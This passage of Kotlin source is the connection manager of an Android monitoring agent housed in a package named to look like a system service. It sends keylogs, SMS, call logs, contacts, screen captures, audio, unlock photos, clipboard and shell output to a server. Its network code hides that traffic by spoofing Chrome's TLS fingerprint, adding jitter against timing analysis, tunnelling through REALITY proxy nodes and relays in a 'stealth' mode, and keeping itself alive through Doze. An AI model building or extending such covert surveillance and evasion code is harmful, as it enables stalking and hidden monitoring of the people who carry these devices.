package com.android.systemservices

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.SystemClock
import android.os.Handler
import android.os.Looper
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.util.Base64
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONObject
import java.security.KeyPairGenerator
import java.security.KeyStore
import java.security.PrivateKey
import java.security.SecureRandom
import java.security.Signature
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedDeque
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import java.net.Inet6Address
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManagerFactory
import javax.net.ssl.X509TrustManager

object SocketManager {
    private const val TAG = "SocketManager"
    private const val KEY_ALIAS = "SentinelMDM_DeviceKey"
    private const val CELL_FALLBACK_AFTER = 2   // escalate to REALITY after only 2 direct failures (aggressive)
    private const val SIO_PATH = "/socket.io"
    private const val RELAY_DIRECT_CHECK_INTERVAL = 3_600_000L // 1 hour — relay-failure path
    private const val RELAY_RETRY_DIRECT_AFTER    = 15 * 60_000L // 15 min — periodic probe while relay is working
    private const val REALITY_RETRY_DIRECT_AFTER  = 15 * 60_000L // 15 min — periodic direct re-probe while on REALITY (auto mode)
    private const val REALITY_ROUNDS_BEFORE_CELL  = 2          // try EVERY reality node this many rounds before the relay
    private const val RELAY_ROUNDS_BEFORE_CELL    = 3          // try EVERY relay door this many rounds before cellular
    private const val CELL_RETRY_WIFI_AFTER       = 180_000L   // 3 min — while on cellular, re-probe wifi/REALITY (don't stick)
    private const val AIRLINE_PORTAL_RETRY_MS     = 90_000L    // inflight portal often isn't ready until airborne
    private const val V6_UPGRADE_MAX_ATTEMPTS     = 2          // v4→v6 upgrade re-dials per network (anti-loop)

    // ± 30 % jitter defeats traffic-timing analysis (reconnect storms look distinctive).
    private fun retryDelay(count: Int): Long {
        val base = minOf(1_000L shl (count - 1), 30_000L)
        val jitter = (base * 0.3 * (Math.random() * 2 - 1)).toLong()
        return (base + jitter).coerceAtLeast(500L)
    }

    // Build a DPI-bypass OkHttp client: Chrome JA3 TLS fingerprint + Chrome HTTP headers.
    internal fun buildOkHttpClient(network: Network?, socksPort: Int? = null): Pair<OkHttpClient, X509TrustManager> {
        val tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm())
        tmf.init(null as KeyStore?)
        val trustManager = tmf.trustManagers.first { it is X509TrustManager } as X509TrustManager
        val sslCtx = SSLContext.getInstance("TLS")
        sslCtx.init(null, arrayOf(trustManager), null)
        val tlsFactory = TlsSocketFactory(sslCtx.socketFactory)

        val builder = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .sslSocketFactory(tlsFactory, trustManager)
            .addInterceptor(DpiBypassInterceptor)

        if (network != null) builder.socketFactory(network.socketFactory)

        // REALITY path: route through the local xray SOCKS5 proxy. The cipher/UA spoofing above is
        // irrelevant here (loopback hop is plain http; the wire is REALITY) but harmless, so the
        // client construction stays unified.
        if (socksPort != null) {
            builder.proxy(java.net.Proxy(java.net.Proxy.Type.SOCKS, java.net.InetSocketAddress("127.0.0.1", socksPort)))
        }

        return Pair(builder.build(), trustManager)
    }

    // ── Android Keystore key management ─────────────────────────────────────
    // Cache key-material so reconnect attempts never do Binder IPC on the main thread.
    // The EC key pair is stable for the life of the install; caching is always valid.
    @Volatile private var keyEnsured = false
    @Volatile private var cachedPubKey: String? = null

    private fun ensureKeyExists() {
        if (keyEnsured) return          // already done — skip Binder IPC
        try {
            val ks = KeyStore.getInstance("AndroidKeyStore").also { it.load(null) }
            if (!ks.containsAlias(KEY_ALIAS)) {
                val kpg = KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore")
                kpg.initialize(
                    KeyGenParameterSpec.Builder(KEY_ALIAS, KeyProperties.PURPOSE_SIGN)
                        .setDigests(KeyProperties.DIGEST_SHA256)
                        .build()
                )
                kpg.generateKeyPair()
                Log.i(TAG, "EC P-256 identity key generated in Android Keystore")
            }
            keyEnsured = true
        } catch (e: Exception) {
            Log.e(TAG, "ensureKeyExists failed: ${e.message}")
        }
    }

    private fun publicKeyBase64(): String {
        cachedPubKey?.let { return it }   // return cached — skip Binder IPC
        return try {
            val ks = KeyStore.getInstance("AndroidKeyStore").also { it.load(null) }
            val encoded = ks.getCertificate(KEY_ALIAS)?.publicKey?.encoded ?: return ""
            Base64.encodeToString(encoded, Base64.NO_WRAP).also { cachedPubKey = it }
        } catch (e: Exception) {
            Log.e(TAG, "publicKeyBase64 failed: ${e.message}")
            ""
        }
    }

    // Signs "<deviceId>:<timestamp>" with the EC private key.
    internal fun signPayload(payload: String): String {
        return try {
            val ks = KeyStore.getInstance("AndroidKeyStore").also { it.load(null) }
            val pk = ks.getKey(KEY_ALIAS, null) as? PrivateKey ?: return ""
            val sig = Signature.getInstance("SHA256withECDSA")
            sig.initSign(pk)
            sig.update(payload.toByteArray(Charsets.UTF_8))
            Base64.encodeToString(sig.sign(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.e(TAG, "signPayload failed: ${e.message}")
            ""
        }
    }

    private var socket: Socket? = null
    // Emits queued while socket is null or not yet connected (e.g. log callbacks firing during reconnect)
    private val pendingEmits = ConcurrentLinkedDeque<Pair<String, JSONObject>>()
    var commandListener: ((JSONObject) -> Unit)? = null
    var connectListener: (() -> Unit)? = null
    var talkChunkListener: ((String, Int) -> Unit)? = null

    // ── Zero-knowledge envelope encryption ──────────────────────────────────────
    // Non-null when this device is owned by a public registered user.
    // All events in ZK_PRIVATE_EVENTS are wrapped via ZkPayloadHelper.wrap() before
    // being sent as a unified "zk_data" event that the server stores opaquely.
    @Volatile private var zkHelper: ZkPayloadHelper? = null

    // Events whose payloads contain private user data — must be ZK-encrypted on ZK-owned devices.
    // Everything NOT in this set is metadata/control and stays plaintext even on ZK devices.
    private val ZK_PRIVATE_EVENTS = setOf(
        // Location
        "location",
        // Media (binary)
        "photo", "audio", "unlock_photo", "audio_segment",
        "screencapture",
        // NOTE: screen_frame / video_frame / audio_chunk are LIVE STREAM events — intentionally
        // excluded from ZK_PRIVATE_EVENTS. ZK-encrypting real-time frames breaks the stream
        // (server cannot relay PCM/JPEG chunks to the browser in real-time if they're wrapped).
        // Live streams are user-initiated and ephemeral; stored captures (screencapture, audio,
        // photo) above cover the persistent private data that actually needs ZK protection.
        // File system
        "file_list", "file_data", "file_chunk",
        // Device inventory
        "app_list", "battery_stats",
        // Communication
        "call_log", "sms_list",
        // Personal data
        "contacts_data", "calendar_data", "usage_stats_data",
        // Input & screen content
        "keylog_data", "screen_text_data", "lockscreen_layout",
        // Behavioural
        "app_foreground", "notification_event",
        "clipboard_event",
        // Network details
        "network_info", "network_logs",
        // Security events
        "security_logs",
        // Geofencing (reveals movement patterns)
        "geofence_alert", "geofence_list",
        // Shell output
        "shell_output", "logcat_line",
        // Bluetooth devices / tracker detection (reveals nearby people's devices)
        "bt_device_event", "tracker_detection",
        // Device status metadata — battery / motion / network summary that drives the live card.
        // On ZK devices this is the user's real-world state, so it must be E2E-encrypted too.
        "device_status"
    )

    // Stream events encrypted with a per-session AES key (no per-frame ECDH overhead).
    // The session key is wrapped once at stream start via startStreamSession().
    // These are NOT in ZK_PRIVATE_EVENTS — they use a separate path via zk_stream_frame event.
    private val ZK_STREAM_EVENTS = setOf("video_frame", "audio_chunk", "screen_frame")

    // Per-stream-session DEKs: keyed by event type ("video_frame", "audio_chunk", "screen_frame")
    private val streamDeks       = ConcurrentHashMap<String, ByteArray>()
    private val streamSessionIds = ConcurrentHashMap<String, String>()

    /** Returns true when this device is assigned to a ZK-encrypted private user account. */
    fun isZkDevice(): Boolean = zkHelper != null

    private val errorCount = AtomicInteger(0)
    @Volatile private var usingCellular = false
    @Volatile private var usingRelay = false
    val isUsingRelay get() = usingRelay
    @Volatile private var usingReality = false
    val isUsingReality get() = usingReality
    // stealth mode only: we've dropped to DIRECT as the LAST resort (REALITY+relay both exhausted).
    // Distinguishes "direct because it's the default" (auto) from "direct because everything else
    // failed" (stealth) so the error ladder routes a direct failure to cellular instead of looping
    // back up to REALITY.
    @Volatile private var usingDirectFallback = false
    /** The relay front door currently selected (rotates through Prefs.relayNodes); "" if none. */
    fun activeRelayUrl(): String = savedContext?.let { relayNodeAt(Prefs(it)) } ?: ""
    @Volatile private var realityNodeIdx = 0
    // REALITY address family for the CURRENT node: 0 = IPv6 (preferred, tried first), 1 = IPv4.
    // IPv6-first (2026-09-23): the agent dials each node's IPv6 literal before its IPv4, and on a
    // v6 failure retries the SAME node over IPv4 before bouncing to the next node — so v6-only
    // outages or v6-less devices degrade cleanly to the legacy IPv4 behavior. Reset to 0 (v6 first)
    // whenever a fresh node is picked, so the ladder is [CA-v6, CA-v4, VA-v6, VA-v4, OR-v6, OR-v4].
    @Volatile private var realityAddrIdx = 0
    @Volatile private var realityAttempts = 0
    @Volatile private var relayAttempts = 0
    @Volatile private var relayNodeIdx = 0
    @Volatile private var lastDirectCheckTime = 0L
    @Volatile private var cellNetwork: Network? = null
    @Volatile private var encActive = false
    private var cellCallback: ConnectivityManager.NetworkCallback? = null
    // Wi-Fi network handle — tracked even when Android won't internet-"validate" it (guest/captive
    // networks: associated + has an IP, but the OS keeps cellular as the default). Lets the agent
    // bind its socket to Wi-Fi instead of silently riding the cellular OS-default.
    @Volatile private var wifiNetwork: Network? = null
    private var wifiCallback: ConnectivityManager.NetworkCallback? = null
    // De-dupe captive-portal auto-clear: attempt at most once per WiFi association (reset when it
    // validates or drops) so we never hammer a portal. Airline SSIDs retry on a short backoff
    // because the portal is often a "wait until 10,000 feet" page at the gate.
    @Volatile private var captivePortalTriedFor: Network? = null
    @Volatile private var lastAirlinePortalTryMs = 0L
    // De-dupe the WiFi-promotion (tear down cellular + restart transport over WiFi) so a burst of
    // onCapabilitiesChanged callbacks for the same validated network doesn't churn the transport.
    @Volatile private var wifiPromotedFor: Network? = null
    // ── Late-IPv6-default upgrade (Google-WiFi / bridge-AP RA gap) ─────────────────────────────
    // A bridge-mode AP (notably Google WiFi) proxies the client's Router Solicitation and answers
    // with its OWN RA (ULA, router-lifetime 0) instead of forwarding it, so the real router's RA —
    // the one carrying `::/0` — only reaches the client on the router's *unsolicited* schedule
    // (radvd default 200–600 s). Consequence: for up to ~10 min after association the network has a
    // v6 ADDRESS but NO v6 default, so an IPv6-first agent that dialed inside that window falls back
    // to IPv4 and then stays there for the whole session. These fields drive a one-shot re-dial to
    // IPv6 the moment the default appears (see maybeUpgradeToV6).
    @Volatile private var physicalV6Default: Boolean? = null   // null = unknown for current network
    // Address family the CURRENT REALITY session was established with (true = IPv6). Used to decide
    // whether a late-arriving v6 default should trigger an upgrade re-dial.
    @Volatile private var realityConnectedV6 = false
    // Upgrade budget — re-armable but CAPPED per network so a network that ADVERTISES v6 yet can't
    // actually reach the nodes over it (broken upstream v6) can't cause an endless dial loop.
    @Volatile private var v6UpgradeNetwork: Network? = null
    @Volatile private var v6UpgradeAttempts = 0
    // Transport the agent's socket is actually bound to: "wifi" | "cellular" | null (OS default / REALITY).
    @Volatile private var boundTransport: String? = null
    /** Transport the agent is actually transmitting on; null = OS default / REALITY-tunnelled. */
    val currentTransport: String? get() = boundTransport
    private var savedContext: Context? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    // Background thread for all buildSocket() scheduling — keeps KeyStore/OkHttp IPC off the main thread.
    private val socketThread = android.os.HandlerThread("sentinel-socket").also { it.start() }
    private val socketHandler = Handler(socketThread.looper)

    /** REALITY is reachable on this build/network config (xray binary present, nodes set, not "direct"). */
    private fun realityCapable(prefs: Prefs, ctx: Context): Boolean =
        prefs.transportMode != "direct" && prefs.realityNodes.isNotEmpty() &&
        TransportManager.binaryAvailable(ctx)

    /** stealth/reality modes start on REALITY (primary), not the exposed direct domain. */
    private fun realityFirst(prefs: Prefs): Boolean =
        prefs.transportMode == "stealth" || prefs.transportMode == "reality"

    fun connect(context: Context) {
        savedContext = context.applicationContext
        errorCount.set(0)
        usingCellular = false
        usingRelay = false
        usingReality = false
        usingDirectFallback = false
        realityAttempts = 0
        relayAttempts = 0
        TransportManager.stop()
        cancelReprobeAlarm()
        registerWifiCallback()
        // REALITY-first ladder (stealth/reality): open on REALITY so the bare MDM domain SNI is
        // never put on the wire. Degrades to direct automatically if xray can't start (buildSocket).
        Prefs(context).let { p0 ->
            if (realityFirst(p0) && realityCapable(p0, context)) {
                usingReality = true
                realityNodeIdx = (Math.random() * p0.realityNodes.size).toInt()
                realityAddrIdx = 0   // fresh node → try its IPv6 first
            }
        }
        // Restore ZK helper from persisted public key so encryption is active immediately
        // on reconnects and app restarts without waiting for the next 'registered' event.
        val storedPub = Prefs(context).zkPubKey
        zkHelper = if (storedPub.isNotEmpty()) {
            try { ZkPayloadHelper(storedPub).also { Log.i(TAG, "ZK encryption restored from Prefs") } }
            catch (e: Exception) { Log.e(TAG, "ZkPayloadHelper restore failed: ${e.message}"); null }
        } else null
        socketHandler.post { buildSocket(null) }
    }

    // ── Doze-proof climb-back / cell→Wi-Fi re-probe ──────────────────────────────────
    // A device parked on a FALLBACK transport (cellular, relay, or direct-as-last-resort) must
    // periodically re-probe back toward the primary (Wi-Fi/REALITY). This previously used
    // java.util.Timer, which Android Doze FREEZES on an idle, unplugged device — so a sleeping
    // phone on cellular never re-checked Wi-Fi and got stuck until someone woke it (confirmed:
    // picking the phone up + unlocking it instantly reconnected Wi-Fi — that was the deferred
    // timer finally firing on Doze exit). We now arm a single AllowWhileIdle AlarmManager wake-up,
    // which fires through Doze (exactly like the agent's deep-sleep / self-restart alarms).
    // MonitoringService routes ACTION_NET_REPROBE → onReprobeAlarm(), which climbs back based on
    // the current transport. The OS rate-limits allow-while-idle alarms in deep Doze (~once every
    // 9-15 min), so the interval may stretch — but it WILL fire, unlike the frozen Timer.
    //   • cellular           → re-probe the default network (Wi-Fi → REALITY)
    //   • relay              → climb back to REALITY (stealth) / direct (auto)
    //   • direct-last-resort → retry REALITY
    private fun scheduleCellWifiProbe() = armReprobeAlarm(CELL_RETRY_WIFI_AFTER)
    private fun scheduleDirectProbe()   = armReprobeAlarm(RELAY_RETRY_DIRECT_AFTER)
    private fun scheduleRealityProbe()  = armReprobeAlarm(REALITY_RETRY_DIRECT_AFTER)

    private fun reprobePendingIntent(ctx: Context): PendingIntent {
        val i = Intent(ctx, MonitoringService::class.java).apply { action = MonitoringService.ACTION_NET_REPROBE }
        return PendingIntent.getService(ctx, 7, i,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
    }

    private fun armReprobeAlarm(delayMs: Long) {
        val ctx = savedContext ?: return
        val am  = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val at  = SystemClock.elapsedRealtime() + delayMs
        val pi  = reprobePendingIntent(ctx)
        try {
            // minSdk 26 → *AndAllowWhileIdle always available; exact wake when the OS permits it.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && am.canScheduleExactAlarms())
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
            else
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
        } catch (e: Exception) { Log.w(TAG, "armReprobeAlarm failed: ${e.message}") }
    }

    private fun cancelReprobeAlarm() {
        val ctx = savedContext ?: return
        try { (ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(reprobePendingIntent(ctx)) }
        catch (_: Exception) {}
    }

    // ── Doze-proof airline portal re-probe ────────────────────────────────────────
    // Android's onCapabilitiesChanged fires ONLY when the network's capabilities CHANGE. A
    // stable-but-unvalidated network (associated + has an IP, portal now actually clear after
    // takeoff or a manual login) stops firing callbacks entirely — so the normal 90s airline
    // retry inside onCapabilitiesChanged is never re-evaluated and the OS never re-probes or
    // promotes the WiFi to the default route. The agent gets stranded riding cellular (which is
    // dead at altitude) even though the gateway authorizes the device. This alarm re-runs the
    // probe independently of callbacks: while the WiFi is still an airline SSID and still not
    // validated, probeClear (falling back to a full trySolve) and, once the portal is clear,
    // reportCleared() → NetworkMonitor.forceReevaluation() → OS promotes the WiFi. Re-arms every
    // AIRLINE_PORTAL_RETRY_MS until validated (then cancels) or the network is gone (also cancels).
    private fun airlinePortalProbePendingIntent(ctx: Context): PendingIntent {
        val i = Intent(ctx, MonitoringService::class.java).apply { action = MonitoringService.ACTION_AIRLINE_PORTAL_PROBE }
        return PendingIntent.getService(ctx, 8, i,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
    }

    private fun armAirlinePortalProbe(delayMs: Long = AIRLINE_PORTAL_RETRY_MS) {
        val ctx = savedContext ?: return
        val am  = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val at  = SystemClock.elapsedRealtime() + delayMs
        val pi  = airlinePortalProbePendingIntent(ctx)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && am.canScheduleExactAlarms())
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
            else
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, at, pi)
        } catch (e: Exception) { Log.w(TAG, "armAirlinePortalProbe failed: ${e.message}") }
    }

    private fun cancelAirlinePortalProbe() {
        val ctx = savedContext ?: return
        try { (ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(airlinePortalProbePendingIntent(ctx)) }
        catch (_: Exception) {}
    }

    /**
     * Fired (Doze-proof) by MonitoringService on ACTION_AIRLINE_PORTAL_PROBE. Re-runs the
     * unvalidated-airline-WiFi probe/solve path that onCapabilitiesChanged would normally drive,
     * so a stable-but-captive network that stops firing capability callbacks still gets cleared
     * and promoted to the OS default route once the portal authorizes the device.
     */
    fun onAirlinePortalProbeAlarm(context: Context) {
        if (savedContext == null) savedContext = context.applicationContext
        val ctx = savedContext ?: return
        val network = wifiNetwork
        if (network == null) { cancelAirlinePortalProbe(); return }   // WiFi dropped
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = try { cm.getNetworkCapabilities(network) } catch (_: Throwable) { null }
        if (caps == null || caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)) {
            cancelAirlinePortalProbe()   // healthy / gone — nothing to nudge
            return
        }
        val ssid = AirlineWifiHelper.currentSsid(ctx)
        if (!AirlineWifiHelper.isKnownInflightSsid(ssid)) { cancelAirlinePortalProbe(); return }
        val now = System.currentTimeMillis()
        if (now - lastAirlinePortalTryMs < AIRLINE_PORTAL_RETRY_MS) {   // respect the 90s portal backoff
            armAirlinePortalProbe()
            return
        }
        lastAirlinePortalTryMs = now
        Thread {
            var cleared = CaptivePortalHelper.probeClear(network)
            if (!cleared) {
                Log.i(TAG, "airline portal probe (alarm) on $ssid — portal not clear, running full solve")
                cleared = AirlineWifiHelper.trySolve(ctx, network, AirlineWifiHelper.gatewayIp(ctx), ssid)
            }
            if (cleared) {
                AirlineWifiHelper.reportCleared(ctx, network)
                Log.i(TAG, "airline portal probe (alarm): clear → re-evaluation requested")
            }
            // Still unvalidated airline WiFi → keep nudging every 90s until the OS flips it
            // VALIDATED (that cancel happens on the next fire, above).
            armAirlinePortalProbe()
        }.apply { isDaemon = true }.start()
    }

    /**
     * Fired by the "…needs sign-in" notification tap. Re-runs the full solve on the current WiFi —
     * trySolve escalates to the WebView portal solver when a portal URL is known, so the user lands
     * on the page that completes SSO/payment/manual login. Also requests OS re-evaluation on success.
     */
    fun onAirlineSignInTap(context: Context) {
        if (savedContext == null) savedContext = context.applicationContext
        val ctx = savedContext ?: return
        val network = wifiNetwork ?: return
        val ssid = AirlineWifiHelper.currentSsid(ctx)
        Log.i(TAG, "airline sign-in alert tapped (ssid=$ssid) — re-running solve")
        Thread {
            val cleared = AirlineWifiHelper.trySolve(ctx, network, AirlineWifiHelper.gatewayIp(ctx), ssid)
            if (cleared) AirlineWifiHelper.reportCleared(ctx, network)
        }.apply { isDaemon = true }.start()
    }

    /**
     * Reclaim WiFi as the agent's transport once it's validated. Tears down any held cellular
     * `requestNetwork` (which is what keeps cellular as the OS *default route* — releasing it lets
     * the validated WiFi reclaim the default), stops the REALITY transport so xray reconnects over
     * the new default, and rebuilds toward the primary (REALITY/WiFi).
     *
     * This is the IMMEDIATE counterpart to the 3-min CELL_RETRY_WIFI re-probe alarm. It is the only
     * thing that moves the agent off cellular when on REALITY: REALITY egress is xray's own
     * subprocess sockets, which follow the OS default route and can't be bound to `wifiNetwork` the
     * way OkHttp's can — so for REALITY "use WiFi" means "make WiFi the OS default", which requires
     * releasing the cellular hold here. (Hence the old `!usingReality` switch-guards were wrong:
     * they left REALITY pinned to cellular forever after a captive portal cleared.)
     */
    private fun promoteToWifi(reason: String) {
        val ctx = savedContext ?: return
        val prefs = Prefs(ctx)
        Log.i(TAG, "Promoting WiFi to primary ($reason) — tearing down cellular hold, restarting transport")
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        usingCellular = false
        usingReality = false
        usingRelay = false
        usingDirectFallback = false
        realityAttempts = 0
        relayAttempts = 0
        cellNetwork = null
        cellCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
        cellCallback = null
        TransportManager.stop()
        // Climb straight back to REALITY (primary) rather than the exposed direct domain.
        if (realityFirst(prefs) && realityCapable(prefs, ctx)) {
            usingReality = true
            realityNodeIdx = (Math.random() * prefs.realityNodes.size).toInt()
            realityAddrIdx = 0   // fresh node → try its IPv6 first
        }
        errorCount.set(0)
        socketHandler.post { buildSocket(null) }   // network=null → OS default (now the validated WiFi)
    }

    /**
     * Fired (Doze-proof) by MonitoringService on ACTION_NET_REPROBE. Drops the current fallback
     * transport and rebuilds toward the primary (Wi-Fi/REALITY); the resulting connect re-arms
     * (still on a fallback) or cancels (back on primary) via the EVENT_CONNECT handler.
     */
    fun onReprobeAlarm(context: Context) {
        if (savedContext == null) savedContext = context.applicationContext
        val ctx   = savedContext ?: return
        val prefs = Prefs(ctx)
        when {
            usingCellular -> {
                Log.i(TAG, "Re-probe alarm — on cellular, re-probing default network (wifi/REALITY)")
                usingCellular = false
                usingReality = false
                usingDirectFallback = false
                realityAttempts = 0
                relayAttempts = 0
                cellNetwork = null
                TransportManager.stop()
                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cellCallback?.let { try { cm.unregisterNetworkCallback(it) } catch (_: Exception) {} }
                cellCallback = null
                // stealth/reality: climb straight back to REALITY (primary), not the exposed direct domain.
                if (realityFirst(prefs) && realityCapable(prefs, ctx)) {
                    usingReality = true
                    realityNodeIdx = (Math.random() * prefs.realityNodes.size).toInt()
                    realityAddrIdx = 0   // fresh node → try its IPv6 first
                }
                errorCount.set(0)
                socketHandler.post { buildSocket(null) }
            }
            usingRelay -> {
                usingRelay = false
                lastDirectCheckTime = System.currentTimeMillis()
                errorCount.set(0)
                if (realityFirst(prefs) && realityCapable(prefs, ctx)) {
                    Log.i(TAG, "Re-probe alarm — relay active, climbing back to REALITY (primary)")
                    usingReality = true
                    realityAttempts = 0
                    realityNodeIdx = (Math.random() * prefs.realityNodes.size).toInt()
                    realityAddrIdx = 0   // fresh node → try its IPv6 first
                } else {
                    Log.i(TAG, "Re-probe alarm — relay active, probing direct connection")
                }
                socketHandler.post { buildSocket(null) }
            }
            usingDirectFallback -> {
                if (!realityCapable(prefs, ctx)) return   // no xray → nothing to climb back to
                Log.i(TAG, "Re-probe alarm — direct (last resort), retrying REALITY (primary)")
                usingDirectFallback = false
                usingReality = true
                realityAttempts = 0
                realityNodeIdx = (Math.random() * prefs.realityNodes.size).toInt()
                realityAddrIdx = 0   // fresh node → try its IPv6 first
                errorCount.set(0)
                socketHandler.post { buildSocket(null) }
            }
            else -> cancelReprobeAlarm()   // already on the primary transport — nothing to climb back from
        }
    }

    /** Pick the current relay door from Prefs.relayNodes, wrapping relayNodeIdx safely. */
    private fun relayNodeAt(prefs: Prefs): String {
        val nodes = prefs.relayNodes
        if (nodes.isEmpty()) return ""
        return nodes[((relayNodeIdx % nodes.size) + nodes.size) % nodes.size]
    }

    private fun buildSocket(network: Network?) {
        val ctx = savedContext ?: return
        val prefs = Prefs(ctx)
        // ── Transport selection ──────────────────────────────────────────────────────────
        // REALITY (preferred when blocked) tunnels through a local xray SOCKS proxy; relay is the
        // legacy CF-Worker fallback; otherwise connect direct. usingReality/usingRelay are driven
        // by the connect-error ladder and the flap handler below.
        var socksPort: Int? = null
        val wantReality = (prefs.transportMode == "reality" || usingReality) &&
            prefs.realityNodes.isNotEmpty() && TransportManager.binaryAvailable(ctx)
        val url: String = when {
            wantReality -> {
                val addresses = prefs.nodeAddresses(realityNodeIdx)
                // IPv6 is tried first ONLY when the active physical network actually has a v6 default
                // route. On bridge-mode APs (e.g. Google WiFi) the router's `::/0` RA can land MINUTES
                // after association, so a v6 dial during that gap is guaranteed to fail (and burns a
                // bounce). Skip straight to IPv4 then let the late-RA upgrade (tryUpgradeToV6) move us
                // onto v6 once the default lands.
                val wantV6 = addresses.size > 1 && realityAddrIdx == 0 && physicalV6Available(ctx)
                if (addresses.size > 1 && !wantV6 && realityAddrIdx == 0) realityAddrIdx = 1
                val node = when {
                    addresses.isEmpty() -> ""
                    wantV6 -> addresses.first()
                    else -> addresses.last()
                }
                if (node.isNotEmpty() && TransportManager.start(ctx, node, prefs.realityPort)) {
                    socksPort = TransportManager.SOCKS_PORT
                    usingReality = true
                    realityConnectedV6 = wantV6
                    Log.i(TAG, "Transport=REALITY node=$node idx=$realityNodeIdx addrFamily=${if (wantV6) "IPv6" else "IPv4"}")
                    TransportManager.TARGET_URL
                } else {
                    // xray failed to start (e.g. binary missing on this ABI) — fall back.
                    usingReality = false
                    Log.w(TAG, "REALITY unavailable — falling back to ${if (usingRelay) "relay" else "direct"}")
                    if (usingRelay && prefs.relayNodes.isNotEmpty()) relayNodeAt(prefs) else prefs.serverUrl
                }
            }
            usingRelay && prefs.relayNodes.isNotEmpty() -> {
                TransportManager.stop()
                val relayDoor = relayNodeAt(prefs)
                Log.i(TAG, "Transport=relay door=$relayDoor idx=$relayNodeIdx")
                relayDoor
            }
            else -> { TransportManager.stop(); prefs.serverUrl }
        }
        if (url.isEmpty()) return

        // Ensure deviceId exists before building the auth payload (needed for key-based auth).
        val deviceId = prefs.getOrCreateDeviceId()

        // Ensure key pair exists in the Keystore.
        ensureKeyExists()
        val pubKey = publicKeyBase64()

        val auth: MutableMap<String, String> = if (prefs.keyEnrolled && pubKey.isNotEmpty()) {
            val ts = System.currentTimeMillis().toString()
            val sig = signPayload("$deviceId:$ts")
            Log.i(TAG, "auth=key-based deviceId=$deviceId keyLen=${sig.length}")
            mutableMapOf("deviceId" to deviceId, "timestamp" to ts, "signature" to sig)
        } else {
            // Not yet enrolled — send public key so server queues this device for admin approval
            val m = mutableMapOf("deviceId" to deviceId)
            if (pubKey.isNotEmpty()) m["publicKey"] = pubKey
            // Enrollment token — sourced from two paths:
            //  1. Admin ADB:        adb shell settings put global sentinel_enrollment_token "TOKEN"
            //  2. Self-install app: AccountLinkActivity stores it in prefs after login
            val globalToken = try {
                android.provider.Settings.Global.getString(ctx.contentResolver, "sentinel_enrollment_token")
                    ?.takeIf { it.isNotBlank() }
            } catch (_: Exception) { null }
            val enrollmentToken = globalToken ?: prefs.enrollmentToken.takeIf { it.isNotBlank() }
            if (enrollmentToken != null) {
                m["enrollmentToken"] = enrollmentToken
                // Clear from Settings.Global (one-time, DO has WRITE_SECURE_SETTINGS)
                if (globalToken != null) try {
                    android.provider.Settings.Global.putString(ctx.contentResolver, "sentinel_enrollment_token", "")
                } catch (_: Exception) { }
            }
            Log.i(TAG, "auth=enrollment deviceId=$deviceId pubKey=${pubKey.isNotEmpty()} token=${enrollmentToken != null}")
            m
        }

        // Single-use enrollment ticket — present in BOTH auth modes:
        //  • enrollment auth  → first-bind auto-enroll (server creates + permanently locks device)
        //  • key-based auth   → rebind-after-wipe (server re-binds to a same-email account)
        // The server validates+consumes it once; SocketManager clears it on key_enrolled.
        prefs.enrollmentTicket.takeIf { it.isNotBlank() }?.let {
            auth["enrollmentTicket"] = it
            Log.i(TAG, "auth: attaching enrollment ticket")
        }

        // Wipe-stable hardware id (ESID/serial) for server-side trial-abuse dedup (v2). Best-effort,
        // alert-only — never block a connect on it. Sent every connect so the server can backfill.
        try {
            val hwId = DeviceOwnerHelper(ctx).stableHardwareId()
            if (hwId.isNotEmpty()) auth["hwId"] = hwId
        } catch (_: Throwable) {}

        encActive = false
        EncryptionHelper.clearSession()
        socket?.off()
        socket?.disconnect()
        socket = null
        // Cancel pending reconnect attempts on the socket thread (not mainHandler — those are UI callbacks).
        socketHandler.removeCallbacksAndMessages(null)

        try {
            val opts = IO.Options()
            opts.reconnection = false            // manual reconnect so we control backoff
            opts.timeout      = 10_000           // initial handshake timeout
            opts.path         = SIO_PATH         // obfuscated path — must match server
            opts.auth         = auth
            // Force WebSocket-only on BOTH non-direct paths (relay AND REALITY):
            //  • Relay: CF Workers terminate idle long-poll HTTP connections in seconds.
